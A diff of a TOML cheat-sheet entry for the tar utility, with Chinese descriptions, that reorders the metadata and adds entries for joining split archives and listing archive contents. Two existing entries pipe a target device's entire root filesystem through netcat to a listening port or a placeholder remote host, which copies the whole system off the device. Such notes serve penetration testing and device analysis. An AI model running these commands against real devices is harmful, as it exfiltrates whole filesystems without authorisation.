@@ -1,10 +1,4 @@
-[meta]
-name = "tar"
-description = "用于创建和管理文件归档包的工具"
-url = "https://man7.org/linux/man-pages/man1/tar.1.html"
-
 examples = []
-
 [[hit]]
 command = "tar cvhf - --exclude=/proc --exclude=/sys --exclude=/dev --exclude=/tmp --exclude=/lost+found --exclude=/media --exclude=/mnt --exclude=/selinux --exclude=/var/cache --exclude=/var/tmp / | nc -l -p <port>"
 description = "在目标设备上，使用 tar 将 filesystem 通过 tar + nc 的方式监听在端口，然后可在其他设备上执行 `nc <host> <port> > fs.tar` 来传输 fs，适用于目标系统内部空间不足的情况"
@@ -12,3 +6,17 @@ description = "在目标设备上，使用 tar 将 filesystem 通过 tar + nc �
 [[hit]]
 command = "tar cvhf - --exclude=/proc --exclude=/sys --exclude=/dev --exclude=/tmp --exclude=/lost+found --exclude=/media --exclude=/mnt --exclude=/selinux --exclude=/var/cache --exclude=/var/tmp / | nc <host> <port>"
 description = "（反过来）在其他设备上执行 `nc -nvlkp <port> | cat > fs.tar`，在目标设备上将 filesystem 通过 tar + nc 传输到端口"
+
+[[hit]]
+command = "cat tarfile.tgz.part00 tarfile.tgz.part01 tarfile.tgz.part02 > tarfile.tgz"
+description = "将 tar 类型的分包合并成一个 tar 包"
+
+[[hit]]
+command = "tar -ztvf tarfile.tgz"
+description = "直接查看 tar 文件内容和结构，不解压"
+
+[meta]
+name = "tar"
+description = "用于创建和管理文件归档包的工具"
+url = "https://man7.org/linux/man-pages/man1/tar.1.html"
+examples = []
